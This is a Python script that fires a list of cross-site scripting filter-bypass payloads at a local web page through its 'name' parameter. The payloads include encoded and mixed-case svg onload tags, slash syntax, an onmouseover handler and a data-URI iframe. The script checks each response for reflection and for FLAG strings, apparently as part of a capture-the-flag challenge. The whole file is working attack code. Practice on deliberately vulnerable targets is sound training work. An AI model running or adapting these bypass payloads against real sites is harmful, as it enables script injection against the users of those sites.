import requests
import urllib.parse
import re

# Base URL for the target
base_url = "http://127.0.0.1:33203/page"

# XSS payload variations to test
payloads_to_test = [
    # 1. HTML entity encoding: <svg onload=alert(&#39;XSS&#39;)>
    ("HTML entity encoding", "<svg onload=alert(&#39;XSS&#39;)>", "html_entity"),
    
    # 2. URL encoding for entire payload: %3Csvg%20onload%3Dalert(%27XSS%27)%3E
    ("URL encoding", "%3Csvg%20onload%3Dalert(%27XSS%27)%3E", "url_encoded"),
    
    # 3. mixed case tags: <SVG ONLOAD=alert('XSS')>
    ("Mixed case tags", "<SVG ONLOAD=alert('XSS')>", "mixed_case"),
    
    # 4. Nested tags: <svg><svg onload=alert('XSS')>
    ("Nested tags", "<svg><svg onload=alert('XSS')>", "nested_tags"),
    
    # 5. Different syntax: <svg/onload=alert('XSS')>
    ("Slash without space", "<svg/onload=alert('XSS')>", "slash_syntax"),
    
    # 6. Whitespace variations: <svg onload = alert('XSS')>
    ("Whitespace variations", "<svg onload = alert('XSS')>", "whitespace"),
    
    # 7. Event handler variations: <svg onmouseover=alert('XSS')>
    ("Event handler variations", "<svg onmouseover=alert('XSS')>", "onmouseover"),
    
    # 8. Data URI: <iframe src="data:text/html,<script>alert('XSS')</script>">
    ("Data URI iframe", '<iframe src="data:text/html,<script>alert("XSS")</script>">', "data_uri")
]

print("[*] Testing XSS Payload Variations against http://127.0.0.1:33203/page")

# Test each payload variation
for test_name, payload, test_id in payloads_to_test:
    print(f"\n[+] Testing: {test_name}")
    print(f"    [PAYLOAD] {payload}")
    
    try:
        # Prepare GET request parameters
        params = {'name': payload}
        response = requests.get(base_url, params=params, timeout=10)
        
        # Check if payload is reflected in response
        payload_reflected = payload in response.text
        response_length = len(response.content)
        
        # Check if alert-related content appears
        alert_indicators = []
        if 'alert' in response.text.lower():
            alert_indicators.append("'alert'")
        if "XSS" in response.text:
            alert_indicators.append("'XSS'")
        
        # Check for FLAG patterns in response
        flag_patterns = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        # Print results
        print(f"    [STATUS]  {response.status_code}")
        print(f"    [LENGTH]  {response_length} bytes")
        print(f"    [REFLECT] Payload reflected: {payload_reflected}")
        
        if alert_indicators:
            print(f"    [ALERT]   Indicators: {', '.join(alert_indicators)}")
        
        if flag_patterns:
            print(f"    [!!]      FLAG DETECTED: {flag_patterns}")
        
        # Print full response for analysis
        print(f"    [RESPONSE]: {response.text}")
        
    except requests.exceptions.Timeout:
        print(f"    [ERROR]   Request timed out")
    except Exception as e:
        print(f"    [ERROR]   {str(e)}")

print("[\n*] Testing complete. Analyze responses for bypass success.")
